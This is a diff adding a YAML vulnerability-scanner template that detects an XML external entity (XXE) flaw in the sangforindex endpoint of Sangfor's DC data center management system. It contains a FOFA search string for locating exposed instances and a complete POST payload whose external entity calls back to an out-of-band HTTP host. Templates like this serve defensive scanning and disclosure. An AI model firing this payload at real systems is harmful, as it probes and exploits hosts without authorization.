@@ -1,0 +1,30 @@
+id: sangfor-dc-sangforindex-xxe
+
+info:
+  name: 深信服 DC数据中心管理系统 sangforindex XML实体注入
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    深信服 DC数据中心管理系统 sangforindex 接口存在XML实体注入漏洞，攻击者可以发送特定的请求包造成XML实体注入
+    FOFA: "SANGFOR 数据中心"
+  tags: sangfor,xxe
+  created: 2023/09/05
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /src/sangforindex
+      headers:
+        Content-Type: text/xml
+      body: |
+        <?xml version="1.0" encoding="utf-8" ?>
+        <!DOCTYPE root [
+            <!ENTITY rootas SYSTEM "{{oob.HTTP}}">
+        ]>
+        <xxx>
+        &rootas;
+        </xxx>
+    expression: oobCheck(oob.ProtocolHTTP, 3)
+expression: r0()
